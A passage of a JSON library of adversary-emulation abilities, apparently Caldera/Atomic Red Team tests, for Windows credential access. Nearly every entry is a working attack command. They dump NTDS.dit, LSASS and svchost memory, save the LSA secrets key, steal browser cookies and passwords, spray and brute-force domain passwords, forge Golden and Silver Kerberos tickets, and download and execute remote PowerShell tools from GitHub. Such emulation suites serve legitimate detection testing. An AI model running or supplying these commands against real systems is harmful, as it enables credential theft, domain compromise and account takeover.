        "description": "This test is intended to be run on a domain Controller.\n\nThe Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability\nuses the \"IFM\" or \"Install From Media\" backup functionality that allows Active Directory restoration or installation of\nsubsequent domain controllers without the need of network-based replication.\n\nUpon successful completion, you will find a copy of the ntds.dit file in the C:\\Windows\\Temp directory.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.003",
            "name": "OS Credential Dumping: NTDS"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "rmdir /q /s C:\\Windows\\Temp\\ntds_T1003 >nul 2>&1",
                    "command": "mkdir C:\\Windows\\Temp\\ntds_T1003 && ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntds_T1003\" q q",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fefe8d4193bd491f55e9aba273f640d8",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c7aa16aea441e7bec9a6391af601acc9": {
        "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); wificreds -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c7aa16aea441e7bec9a6391af601acc9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1353d954c020fa5ff039b7e85ee261bc": {
        "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.004",
            "name": "Credentials from Password Stores: Windows Credential Manager"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1'); Invoke-WCMDump",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1353d954c020fa5ff039b7e85ee261bc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6b8a391237b7169d02dd6538f8290345": {
        "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1187",
            "name": "Forced Authentication"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1'); Invoke-Internalmonologue -command \"-Downgrade true -impersonate true -restore true\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6b8a391237b7169d02dd6538f8290345",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0501437f74ad9350b96fdaf64d0fb6c7": {
        "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del \"%temp%\\nanodump.dmp\" >nul 2> nul",
                    "command": "%temp%\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0501437f74ad9350b96fdaf64d0fb6c7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "2c6e39a39ebf794d74417a7b1291463b": {
        "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); lazagnemodule -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2c6e39a39ebf794d74417a7b1291463b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f18e286ad68e09c2a04af15498b0b261": {
        "description": "Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) \nbut without all the extra code that makes the script get blocked by many AVs. \nThis atomic test will attempt a single password against all users in a password list at $env:Temp\\usersdpsLight.txt. You can create this file manually\nor with the automated prereq_command. The prereq_command will limit the user list to 200 users by default to help you avoid massive account lockout.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.003",
            "name": "Brute Force: Password Spraying"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) { ; } else {Write-Host -NoNewLine \"Reading Users.\"; $netOutput = net users /domain; $netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)]); $userLimit = 200; $usercount = 0; foreach ($line in $netOutput) {;   if($usercount -ge $userLimit){break};   $line = $line.trim();   $line = $line -split '\\s\\s+';   foreach ($user in $line){;     if($usercount -ge $userLimit){break};     Add-Content $env:Temp\\usersdpsLight.txt $user;     $usercount = $usercount + 1;     }  ; }; Write-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"};  ;  function Invoke-dpsLight ($Password, $userlist) {; $users = Get-Content $userlist; $Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName; foreach ($User in $users) {;   $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password);   if ($Domain_check.name -ne $null) {;     Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\";   };   else { Write-Host \". \" -NoNewline}; }; Write-Host -ForegroundColor green \"Finished\"; }; Invoke-dpsLight \"Spring2020\" $env:Temp\\usersdpsLight.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f18e286ad68e09c2a04af15498b0b261",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "74982b5ad2508dfeb87f03c47e89f0c6": {
        "description": "This module runs the Windows executable of PetitPotam in order to coerce authentication for a remote system.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1187",
            "name": "Forced Authentication"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "& \"$env:TEMP\\PetitPotam.exe\" 10.0.0.3 10.0.0.2 1; Write-Host \"End of PetitPotam attack\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "74982b5ad2508dfeb87f03c47e89f0c6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "817ef88e270ebac1589a655db5d34e86": {
        "description": "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1539",
            "name": "Steal Web Session Cookie"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1539FirefoxCookies.txt -erroraction silentlycontinue",
                    "command": "stop-process -name \"firefox\" -force -erroraction silentlycontinue; $CookieDBLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite\"; \"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];\" | cmd /c $env:temp\\sqlite-tools-win32-x86-3380200\\sqlite3.exe \"$CookieDBLocation\" | out-file -filepath \"$env:temp\\T1539FirefoxCookies.txt\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "817ef88e270ebac1589a655db5d34e86",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a0a621085ca2a35fb54fdfeedc8ef1b2": {
        "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore; Remove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore",
                    "command": "Import-Module ActiveDirectory -Force ; Import-Module AADInternals -Force | Out-Null; $dcServerName = (Get-ADDomainController).HostName; $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"; $PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList; $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; $base = \"LDAP://CN=$group,$container,$parent\"; $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null; $aduser = $ADSearch.FindOne(); $keyObjectGuid = $ADUser.Properties[\"displayName\"] ; $ADSearch.PropertiesToLoad.Clear(); $ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null; $ADSearch.Filter=\"(l=$keyObjectGuid)\"; $aduser=$ADSearch.FindOne() ; $key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] ; Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; Get-ChildItem | Where-Object {$_ -like \"ADFS*\"}; Write-Host \"`nCertificates retrieved successfully\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a0a621085ca2a35fb54fdfeedc8ef1b2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b3364338cd546a25a6bec06c2ac91605": {
        "description": "Will read username and password combos from a file or stdin (format username:password) and perform a bruteforce attack\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.004",
            "name": "Brute Force: Credential Stuffing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "cd $env:temp; .\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\\bruteforce.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b3364338cd546a25a6bec06c2ac91605",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b889948b60591c9fae80f96e54357985": {
        "description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.001",
            "name": "Steal or Forge Kerberos Tickets: Golden Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; cmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden; $filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name; @\"; >%TEMP%\\golden.txt 2>&1 (;   echo Purge existing tickets and create golden ticket:;   klist purge;   cd %temp%;   \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile;   echo.;   echo Requesting SYSVOL:;   dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL;   ;   echo.;   echo Tickets after requesting SYSVOL:;   klist;   echo.;   echo End of Golden Ticket attack; ); \"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Golden Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\golden.txt; Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b889948b60591c9fae80f96e54357985",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "cf4411185e815ccecbe712b46ae2156e": {
        "description": "[Github Repo](https://github.com/SaulBerrenson/BrowserStealer) Simple password/cookies stealer for chrome, edge, and gecko based browsers (30 listed working). This attack simulates stealing the data from the browser files and printing them to the command line.\nIf using to test with Firefox, if the browser is x64 you need to use the x64 build\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"$env:temp\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Remove-Item \"$env:temp\\Login Data\" > $null",
                    "command": "Copy-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -Destination \"$env:temp\" > $null; Remove-Item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" > $null; Copy-Item \"$env:PathToAtomicsFolder\\T1555.003\\src\\Login Data\" -Destination \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\\" > $null; cd \"$env:PathToAtomicsFolder\\T1555.003\\bin\"; .\\BrowserCollector.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cf4411185e815ccecbe712b46ae2156e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b6866a67857c39595af91ca3db7804fd": {
        "description": "Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.002",
            "name": "Steal or Forge Kerberos Tickets: Silver Ticket"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore; $domain_sid = \"S-1-5-21-DEFAULT\"; If ($domain_sid -Match \"DEFAULT\") {;   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-')); }; @\"; >%TEMP%\\silver.txt 2>&1 (;   echo Purge existing tickets and create silver ticket:;   klist purge;   $env:TEMP\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:silverticketfakeuser /service:HOST /target:%logonserver:\\\\=%.%userdnsdomain% /ptt\" \"exit\";   echo.;   echo executing:schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   schtasks /query /S %logonserver:\\\\=%.%userdnsdomain%;   ;   echo.;   echo Tickets after requesting schtasks:;   klist;   echo.;   echo End of Silver Ticket attack; ); \"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat; echo \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null; do {;   Start-Sleep 1;   Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {;     if ($_ -match 'End of Silver Ticket attack') { break } ;   }; } while ($false); Get-Content $env:TEMP\\silver.txt; Remove-Item $env:TEMP\\silver.bat -ErrorAction Ignore; Remove-Item $env:TEMP\\silver.txt -ErrorAction Ignore",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b6866a67857c39595af91ca3db7804fd",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "aee64e494f7adfb1867d67f7ee08e5c6": {
        "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command \"all\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aee64e494f7adfb1867d67f7ee08e5c6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4497e74ad70df1a721117e28ee167174": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -ErrorAction Ignore",
                    "command": "if (Test-Path 'C:\\Windows\\Temp\\xordump.exe') { ; } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile C:\\Windows\\Temp\\xordump.exe};  ;  C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4497e74ad70df1a721117e28ee167174",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "32df42a1c7b596e73b7e4eee24438994": {
        "description": "Simulates an adversary accessing encrypted credentials from Opera web browser's login database. \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\Login Data\" -Force -ErrorAction Ignore",
                    "command": "Copy-Item \"$env:APPDATA\\Opera Software\\Opera Stable\\Login Data\" -Destination $env:temp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "32df42a1c7b596e73b7e4eee24438994",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d74777514cba5a4fd4f297261ed0d8ef": {
        "description": "This module will extract the credentials from Windows Credential Manager",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-PasswordVaultCredentials -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d74777514cba5a4fd4f297261ed0d8ef",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f6867f2b9b1b3c2eb733ad7ce7438f04": {
        "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); decryptteamviewer -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f6867f2b9b1b3c2eb733ad7ce7438f04",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "18f31c311ac208802e88ab8d5af8603e": {
        "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore",
                    "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "18f31c311ac208802e88ab8d5af8603e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ab197d18655e2ed6176453c7b88d3a11": {
        "description": "Attempt to brute force Active Directory domain user on a domain controller, via LDAP, with NTLM or Kerberos\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.001",
            "name": "Brute Force: Password Guessing"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "if (\"NTLM\".ToLower() -NotIn @(\"ntlm\",\"kerberos\")) {;   Write-Host \"Only 'NTLM' and 'Kerberos' auth methods are supported\";   exit 1; }; [System.Reflection.Assembly]::LoadWithPartialName(\"System.DirectoryServices.Protocols\") | Out-Null; $di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(\"$env:UserDnsDomain\",389); $passwordList = Get-Content -Path 5cb955_passwords.txt; foreach ($password in $passwordList){;   $credz = new-object System.Net.NetworkCredential(\"$ENV:USERNAME\", $password, \"$env:UserDnsDomain\");   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);   try {;     Write-Host \" [-] Attempting ${password} on account $ENV:USERNAME.\";     $conn.bind();     Write-Host \" [!] $ENV:USERNAME:${password} are valid credentials!\";   } catch {;     Write-Host $_.Exception.Message;   }; }; Write-Host \"End of bruteforce\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "5cb955_passwords.txt"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ab197d18655e2ed6176453c7b88d3a11",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "f609f649d76bc42167d86a5a7aaccaf9": {
        "description": "Dump secrets key from Windows registry\nWhen successful, the dumped file will be written to $env:Temp\\secrets.\nAttackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.\nhttps://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/#:~:text=LSA%20Secrets%20is%20a%20registry,host%2C%20local%20security%20policy%20etc.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.004",
            "name": "OS Credential Dumping: LSA Secrets"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\secrets >nul 2> nul",
                    "command": "PathToAtomicsFolder\\T1003.004\\bin\\PsExec.exe -accepteula -s reg save HKLM\\security\\policy\\secrets %temp%\\secrets /y",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f609f649d76bc42167d86a5a7aaccaf9",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "acc918c17efc1b84ebcc3bf764211cd4": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul",
                    "command": "PathToAtomicsFolder\\T1003.001\\bin\\Outflank-Dumpert.exe",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "acc918c17efc1b84ebcc3bf764211cd4",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "70850854e26426b18a74438dc5d7fbfc": {
        "description": "Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1110.002",
            "name": "Brute Force: Password Cracking"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\hashcat6.7z >nul 2>&1 && del %temp%\\7z1900.exe >nul 2>&1 && del %temp%\\7z /Q /S >nul 2>&1 && del %temp%\\hashcat-unzip /Q /S >nul 2>&1",
                    "command": "cd %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe\\.. && %temp%\\hashcat6\\hashcat-6.1.1\\hashcat.exe -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule c5068b_sam.txt cab59f_password.lst",
                    "payloads": [
                        "c5068b_sam.txt",
                        "cab59f_password.lst"
                    ]
                }
            }
        },
